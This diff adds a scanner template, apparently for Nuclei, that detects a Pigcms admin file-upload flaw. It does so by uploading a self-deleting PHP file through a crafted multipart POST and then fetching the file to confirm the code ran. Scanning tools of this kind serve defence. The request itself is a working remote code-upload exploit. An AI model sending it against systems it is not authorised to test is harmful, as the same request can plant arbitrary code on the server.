@@ -1,0 +1,54 @@
+id: pigcms-admin-php-writefile
+info:
+  name: Pigcms Admin PHP File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for a vulnerability in Pigcms admin that allows file upload.
+    It uploads a PHP file and attempts to verify code execution by extracting a unique identifier.
+  reference:
+    - https://xz.aliyun.com/t/10470
+variables:
+  r1: "{{rand_text_alpha(8)}}"
+  r2: "{{rand_text_alpha(8)}}"
+http:
+  - raw:
+      - |
+        POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190666
+
+        ----------------------------835846770881083140190666
+        Content-Disposition: form-data; name="filePath"; filename="{{r1}}.php"
+        Content-Type: video/x-flv
+
+        <?php echo "{{r2}}"; unlink(__FILE__); ?>
+        ----------------------------835846770881083140190666--
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "302 Found"
+      - type: regex
+        part: body
+        regex:
+          - "MAIN_URL_ROOT(?P<path>.+)"
+    extractors:
+      - type: regex
+        regex:
+          - "MAIN_URL_ROOT(?P<path>.+)"
+        group: 1
+        internal: true
+  - raw:
+      - |
+        GET /cms/{{path}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{r2}}"
